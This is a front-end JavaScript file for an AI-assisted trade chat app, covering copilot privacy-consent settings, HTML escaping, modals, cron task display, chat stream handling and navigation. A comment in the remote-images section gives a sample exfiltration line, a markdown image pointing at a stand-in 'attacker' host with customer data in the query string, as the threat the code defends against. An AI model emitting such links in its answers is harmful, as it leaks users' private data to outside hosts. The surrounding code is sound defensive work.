// ═════════════════════ UI HELPERS ═════════════════════
function $(id) { return document.getElementById(id); }
function showModal(id) { $(id).classList.remove('hidden'); }
function hideModal(id) { $(id).classList.add('hidden'); }

// 按钮内联图标（Lucide）。图标缺失时返回空串，不阻断按钮文字。
function btnIcon(name, size) {
    return (typeof iconHtml === 'function') ? iconHtml(name, size || 16) : '';
}

// ── 聊天副驾设置（默认关闭；未同意隐私说明不能开启）────────────────────────
async function showCopilotSettings() {
    const resp = await api('GET', '/api/trade/copilot/settings');
    if (!resp || !resp.settings) return;
    const s = resp.settings;
    const required = resp.required_consent_version || 1;
    $('copilot-required-version').textContent = required;
    $('copilot-consent').checked = (s.consent_version || 0) >= required;
    $('copilot-enabled').checked = !!s.enabled;
    $('copilot-enabled').disabled = !$('copilot-consent').checked;
    $('copilot-use-clipboard').checked = !!s.use_clipboard;
    $('copilot-max-chars').value = s.clipboard_max_chars || 3000;
    $('copilot-refused-apps').value = (s.refused_apps || []).join('\n');
    $('copilot-hotkey').value = s.hotkey || '';

    const av = resp.availability || {};
    const rt = resp.runtime || {};
    const lines = [];
    lines.push('副驾进程：' + (rt.running ? '运行中' : '未运行'));
    if (rt.error) lines.push('上次启动：' + rt.error);
    if (av.hotkey) lines.push('全局热键：' + (av.hotkey.available ? '可用' : '不可用（' + (av.hotkey.reason || '') + '）'));
    if (av.ui) lines.push('悬浮窗：' + (av.ui.available ? '可用' : '不可用（' + (av.ui.reason || '') + '）'));
    $('copilot-availability').textContent = lines.join('；');
    showModal('copilot-settings-modal');
}

function onCopilotConsentChange() {
    const ok = $('copilot-consent').checked;
    $('copilot-enabled').disabled = !ok;
    if (!ok) $('copilot-enabled').checked = false;
}

async function saveCopilotSettings() {
    const consent = $('copilot-consent').checked
        ? Number($('copilot-required-version').textContent) : 0;
    const enabled = $('copilot-enabled').checked;
    if (enabled && !consent) {
        toast('请先勾选同意隐私说明');
        return;
    }
    const isMac = /Mac/.test(navigator.platform || '');
    const body = {
        consent_version: consent,
        enabled,
        use_clipboard: $('copilot-use-clipboard').checked,
        clipboard_max_chars: Math.max(1, parseInt($('copilot-max-chars').value, 10) || 3000),
        refused_apps: $('copilot-refused-apps').value.split('\n').map(x => x.trim()).filter(Boolean),
        hotkey: $('copilot-hotkey').value.trim() || (isMac ? 'cmd+shift+space' : 'ctrl+shift+space'),
    };
    const resp = await api('PUT', '/api/trade/copilot/settings', body);
    if (resp && resp.settings) {
        hideModal('copilot-settings-modal');
        const rt = resp.runtime || {};
        if (resp.settings.enabled && rt.running === false) {
            toast('副驾设置已保存，但进程启动失败：' + (rt.error || '未知原因'), {sticky: true});
        } else if (resp.settings.enabled) {
            toast('副驾已开启，进程运行中；按热键触发');
        } else {
            toast('副驾已关闭');
        }
    }
}
function toast(msg, opts) {
    // sticky：不自动消失，带 × 关闭按钮。升级失败/警告这类必须看清的提示用它 ——
    // 3 秒自动消失的 toast 对小白用户等于没提示（2026-10-29 反馈「一闪而过」）。
    const sticky = !!(opts && opts.sticky);
    const c = $('toast-container');
    const t = document.createElement('div');
    t.className = 'toast' + (sticky ? ' sticky' : '');
    t.textContent = msg;
    if (sticky) {
        const x = document.createElement('button');
        x.type = 'button'; x.className = 'toast-close'; x.textContent = '×';
        x.setAttribute('aria-label', '关闭');
        x.onclick = function () { t.remove(); };
        t.appendChild(x);
    } else {
        setTimeout(() => t.remove(), 3000);
    }
    c.appendChild(t);
    return t;
}
// #region remote-images —— 远程图片改为点击加载（审计 P1-E），勿删标记
// 模型回答里出现 `![](https://attacker/?d=<客户数据>)` 时，浏览器渲染即外带
// 数据、零点击。这里把跨源 http(s) 图片替换成占位按钮，用户点了才请求。
function _isRemoteImageSrc(src, origin) {
    var raw = String(src || '').trim();
    if (!raw) return false;
    try {
        var abs = new URL(raw, (typeof location !== 'undefined' ? location.href : 'http://localhost/'));
        if (abs.origin === (origin || (typeof location !== 'undefined' ? location.origin : abs.origin))) return false;
        return abs.protocol === 'http:' || abs.protocol === 'https:';
    } catch (e) {
        return false;
    }
}

function neutralizeRemoteImages(root) {
    if (!root || !root.querySelectorAll) return;
    var imgs = root.querySelectorAll('img[src]');
    for (var i = 0; i < imgs.length; i++) {
        var img = imgs[i];
        var src = img.getAttribute('src') || '';
        if (!_isRemoteImageSrc(src)) continue;
        var abs = new URL(src, location.href);
        var ph = document.createElement('button');
        ph.type = 'button';
        ph.className = 'remote-img-hold';
        ph.textContent = '在新标签页打开图片（' + abs.hostname + '）';
        (function (url, node) {
            node.addEventListener('click', function () {
                // W7：CSP 只允许同源图片，在当前页插 <img> 只会裂图。
                // 改为新标签页打开链接；noopener/noreferrer 阻断反向控制与 Referer。
                if (typeof window !== 'undefined' && typeof window.open === 'function') {
                    window.open(url, '_blank', 'noopener,noreferrer');
                }
            });
        })(abs.href, ph);
        if (img.parentNode) img.parentNode.replaceChild(ph, img);
    }
}
// #endregion remote-images

// #region html-escape-utils —— 这段被 tests_js/esc.test.js 按标记整体抽取测试，勿删标记
// HTML 转义表：& < > 三个是文本上下文必需，" 和 ' 是属性上下文必需
// （不转引号时，值里的一个 " 就能闭合 value="..." 并注入新属性）
const _ESC_MAP = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };

// HTML 文本 / 属性转义。转义后仅做还原，不丢内容；对 null/undefined/0 返回空串（沿用原语义）
function esc(s) {
    return String(s || '').replace(/[&<>"']/g, function (ch) { return _ESC_MAP[ch]; });
}

// 内联事件处理器（onclick="fn('...')"）里的 JS 字面量转义
// 先用 JSON.stringify 得到带引号的合法 JS 串，再整体做 HTML 属性转义。
// 顺序不可颠倒：浏览器会先解码 HTML 实体，再把结果交给 JS 解析器
function escJs(s) {
    return esc(JSON.stringify(String(s || '')));
}
// #endregion html-escape-utils

// #region modal-utils —— 这段被 tests_js/modal.test.js 按标记整体抽取测试，勿删标记
// 静态模版弹窗白名单：它们在 trade_chat.html 里写死，动态清理时必须跳过。
// 新增静态弹窗要同步加进来，否则会被 _removeDynamicModals 当作动态弹窗删掉。
const _STATIC_MODAL_IDS = new Set(['company-modal','customer-modal','library-modal','upgrade-help-modal','skills-help-modal','copilot-settings-modal']);
// 安全移除动态弹窗（跳过静态模版弹窗避免误删 HTML 中的 modal-backdrop 骨架）
function _removeDynamicModals() {
    document.querySelectorAll('.modal-backdrop').forEach(function(e) {
        if (!_STATIC_MODAL_IDS.has(e.id)) e.remove();
    });
}
// 关闭订单弹窗。必须按 id 精确移除：querySelector('.modal-backdrop') 返回文档序第一个，
// 那是静态的 #company-modal，会把公司设置弹窗删掉并使后续 showAddCompanyModal 抛 TypeError
function _closeOrderModal() {
    const el = document.getElementById('order-modal-backdrop');
    if (el) el.remove();
}
// #endregion modal-utils

// #region cron-task-line
/**
 * 渲染一条待处理的 cron 任务行。
 *
 * 三种状态必须区分开（后端用 unknown_schedule 表达第三态）：
 *   - 已完成但无输出 / 已过时（missed=true）→ ⚠ 红色「已过时」
 *   - 确实还没到点（missed=false）        → ○「HH:MM」
 *   - **调度解析不出来**（unknown_schedule）→ ? 「调度未知」
 * 第三态此前被当成"还没到点"，用户会一直以为任务只是没到时间 ——
 * 实际它可能从未执行过（步进式 cron 表达式解析不出具体时刻）。
 */
function _cronTaskLine(t) {
    const unknown = !!(t && t.unknown_schedule);
    const missed = !!(t && t.missed);
    const color = missed ? 'var(--accent-red)' : 'var(--text-muted)';
    const mark = unknown ? '?' : (missed ? '⚠' : '○');
    // scheduled 为 null（未知调度）时不能直接渲染，否则界面上出现 "null"
    const when = unknown ? '调度未知' : (t.scheduled || '');
    let suffix = '';
    if (missed) suffix = '<span style="color:var(--accent-red);font-size:11px;">（已过时）</span>';
    else if (unknown) suffix = '<span style="color:var(--text-muted);font-size:11px;">（无法解析调度时间）</span>';
    return `<div style="display:flex;align-items:center;gap:8px;padding:3px 0;font-size:13px;">`
        + `<span style="color:${color};">${mark}</span>`
        + `<span style="font-weight:500;color:${missed ? 'var(--accent-red)' : ''};">${esc(t.name)}</span>`
        + `<span style="color:var(--text-muted);font-size:11px;">${esc(when)}</span>`
        + suffix + `</div>`;
}
// #endregion cron-task-line

// #region sse-outcome
/**
 * 流结束后的分类与兜底文案。判据是「有没有收到 done」：
 *   - done 是服务端在 finally 里必发的事件（trade/api/chat.py），收到它说明
 *     服务端走完了整个流程 —— 此时还没有内容，就是服务端一侧没能给出来。
 *   - 没收到 done 说明连接中途断了 —— 属于网络/客户端侧。
 * 历史 bug：两者（外加 agent 线程静默死亡）都显示同一句「Agent 未返回有效回复」，
 * 用户既不知道原因也不知道该做什么。
 */
function _sseStreamOutcome(sawResponse, sawDone) {
    if (sawResponse) return { kind: 'response' };
    if (sawDone) {
        return { kind: 'silent', message: '⚠️ 服务端未能给出回复（请求已结束但内容为空）。请重试一次；若反复出现，请把这条消息发给技术支持。' };
    }
    return { kind: 'interrupted', message: '⚠️ 连接中断，未收到回复。请检查网络后重试。' };
}
// #endregion sse-outcome

// #region stream-guard —— 这段被 tests_js/stream-guard.test.js 按标记整体抽取测试，勿删标记
// 聊天流的归属记账：记录「当前这条流属于哪个公司」。
// 存在的理由：sendMsg 里的 AbortController 是局部变量，切换公司时无人能中止它，
// 旧流跑完后又会走 addMsg()，而 addMsg 读全局 currentChatContainer（已指向新公司），
// 于是 A 公司的回复被写进 B 公司的会话窗口。归属记账让切公司能统一作废旧流。
let _chatStream = null;  // { cid, ctl }

// 开始一条属于 cid 的聊天流，返回它的 AbortController
function _beginChatStream(cid) {
    const ctl = new AbortController();
    _chatStream = { cid: cid, ctl: ctl };
    return ctl;
}

// 作废当前聊天流（切换公司时调用），保证旧流不再往页面写内容
function _abortChatStream() {
    if (_chatStream) {
        _chatStream.ctl.abort();
        _chatStream = null;
    }
}

// 流收尾时清理自己那条（仅当它仍是当前流，避免误清用户切公司后新建的流）
function _endChatStream(ctl) {
    if (_chatStream && _chatStream.ctl === ctl) _chatStream = null;
}

// 该公司的流是否仍是当前活跃流（旧流据此丢弃输出）
function _chatStreamBelongsTo(cid) {
    return !!_chatStream && _chatStream.cid === cid;
}
// #endregion stream-guard

// ═════════════════════ NAVIGATION ═════════════════════
// 视图缓存：{ viewKey: { element, rendered, context } }
const viewCache = {};
// 当前活跃的 chat 容器（用于解决多视图 DOM 中相同 ID 元素的查找问题）
let currentChatContainer = null;

function _replaceMainContent(html) {
    /** 替换主区内容，但保留统一外壳顶栏（zip s1–s4）。 */
    const main = $('main-content');
    for (const child of Array.from(main.children)) {
        if (child.id === 'dust' || child.id === 'app-top' || child.id === 'app-top-dd' || child.id === 'customer-wall' || child.id === 'customer-profile') continue;
        child.remove();
    }
    main.insertAdjacentHTML('beforeend', html);
}

function navToView(view, chatCtx, chatName) {
    // 切视图时关闭客户详情/画像页内视图，避免 body.wall-open / profile-open 把新视图隐藏
    if (typeof closeCustomerProfile === 'function') closeCustomerProfile();
    if (typeof closeCustomerWall === 'function') closeCustomerWall();
    // W15 O-14：私密备忘录浮层挂在 body 上，不属于任何视图，切视图必须关掉
    document.querySelectorAll('#memo-modal').forEach(function (el) { el.remove(); });
    // 新手引导进行中时阻止导航
    if (!isOnboardingCompleted() && document.getElementById('onboarding-panel')) {
        toast(t('toast.complete_onboarding'));
        return;
    }
    // 未选择公司时，所有菜单点击都显示固定提示页
    if (!currentCompanyId) {
        renderNoCompanyPage();
        return;
    }
    // 付费栏目的深链/恢复兜底：入口虽然隐藏了，仍需挡住内部调用与恢复的旧视图
    if (_isPaidDestination(view, chatCtx) && !_licenseGateAllowsPaid()) {
        toast(t('license.paid_only'));
        return;
    }

    // 侧边栏合并：除文档库（docs）外，原 8 个聊天入口统一收口到「对话」（daily）
    if (view === 'chat' && chatCtx !== 'docs') {
        chatCtx = 'daily';
        if (!chatName || chatName === '今日简报') chatName = t('nav.daily');
    }

    currentView = view;
    if (chatCtx) { currentChatContext = chatCtx; currentChatName = chatName || ''; }
    // 统一对话页使用右栏承载简报/待办/定时任务，顶部横幅隐藏（zip s1 版式）
    document.body.classList.toggle('view-daily', view === 'chat' && chatCtx === 'daily');
    saveState();

    // Update sidebar active
    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
    const activeItem = document.querySelector(`.nav-item[data-view="${view}"][data-chat-context="${chatCtx||''}"]`) ||
                       document.querySelector(`.nav-item[data-view="${view}"]`);
    if (activeItem) activeItem.classList.add('active');

    // 顶栏标题（zip s1–s4 统一外壳；P7/U2：走 i18n 且优先回退 topMeta[view] 避免残留旧 chatName）
    function _resolveTopMeta(v, ctx, fallbackName) {
        const topMeta = {
            'chat-daily': [t('nav.daily'), '/ CHAT'],
            'chat-docs': [t('nav.docs'), '/ LIBRARY'],
            'customers': [t('nav.customers'), '/ CUSTOMERS'],
            'suppliers': [t('nav.suppliers'), '/ SUPPLIERS'],
            'mailboxes': [t('nav.mailboxes'), '/ MAILBOXES'],
            'tasks': [t('nav.tasks'), '/ CRON'],
            'history': [t('nav.history'), '/ HISTORY'],
            'visit': [t('nav.visit'), '/ SITE VISIT'],
        };
        return topMeta[v + (ctx ? '-' + ctx : '')] || topMeta[v] || [fallbackName || '', ''];
    }
    const topInfo = _resolveTopMeta(view, chatCtx, chatName);
    const topTitleEl = document.getElementById('app-top-title');
    const topLblEl = document.getElementById('app-top-lbl');
    if (topTitleEl) topTitleEl.textContent = topInfo[0];
    if (topLblEl) topLblEl.textContent = topInfo[1];
    window.refreshTopTitle = function () {
        const info = _resolveTopMeta(currentView, currentChatContext, '');
        const te = document.getElementById('app-top-title');
        const le = document.getElementById('app-top-lbl');
        if (te && info[0]) te.textContent = info[0];
        if (le && info[1]) le.textContent = info[1];
    };

    // 隐藏所有视图，并清除非缓存内容（如 empty state）
    const main = $('main-content');
    for (const key in viewCache) {
        viewCache[key].element.style.display = 'none';
    }
    // 移除 main 中不属于视图缓存的子元素（首次从 empty state 切换时）
    const cachedIds = new Set(Object.keys(viewCache).map(k => 'view-' + k));
    for (const child of Array.from(main.children)) {
        // 全局横幅与统一外壳顶栏不随视图切换删除
        if (child.id === 'guidance-bar' || child.id === 'dust' || child.id === 'app-top' || child.id === 'app-top-dd' || child.id === 'customer-wall' || child.id === 'customer-profile') continue;
        if (!cachedIds.has(child.id)) {
            child.remove();
        }
    }

    // 构建缓存 key
    const cacheKey = view + (chatCtx ? '-' + chatCtx : '');

    if (!viewCache[cacheKey]) {
        // 首次渲染此视图：创建容器 div 并挂到 main
        const container = document.createElement('div');
        container.className = view === 'chat' ? 'chat-view' : 'panel-view';
        container.id = 'view-' + cacheKey;
        main.appendChild(container);
        viewCache[cacheKey] = { element: container, rendered: false };

        switch (view) {
            case 'chat':
                currentChatContainer = container;
                renderChatViewInto(container, chatCtx, chatName);
                break;
            case 'customers':
                renderCustomersViewInto(container);
                break;
            case 'suppliers':
                renderSuppliersViewInto(container);
                break;
            case 'mailboxes':
                renderMailboxesViewInto(container);
                break;
            case 'tasks':
                renderTasksViewInto(container);
                break;
            case 'history':
                renderHistoryViewInto(container);
                break;
            case 'visit':
                renderVisitPlansViewInto(container);
                break;
        }
        viewCache[cacheKey].rendered = true;
    }

    viewCache[cacheKey].element.style.display = 'flex';
    // 记录当前活跃的 chat 容器
    if (view === 'chat') {
        currentChatContainer = viewCache[cacheKey].element;
        // 切换到聊天视图时直接滚动到底部（最新消息）
        requestAnimationFrame(() => {
            const msg = currentChatContainer?.querySelector('#chat-messages');
            if (msg) msg.scrollTop = msg.scrollHeight;
        });
        // 绑定滚动监听——每次激活聊天视图都重新挂载浮标
        setTimeout(() => {
            const msg = currentChatContainer?.querySelector('#chat-messages');
            if (msg) _ensureScrollHint(msg);
        }, 300);
    }
    // 常驻右栏：切换视图时立即刷新（不等 30s 轮询）
    if (typeof loadCronStatus === 'function' && typeof currentCompanyId !== 'undefined' && currentCompanyId) {
        loadCronStatus(true);
    }
    // 待办是独立数据源，切视图时同样立即刷新
    if (typeof loadTodos === 'function' && typeof currentCompanyId !== 'undefined' && currentCompanyId) {
        loadTodos(true);
    }
}

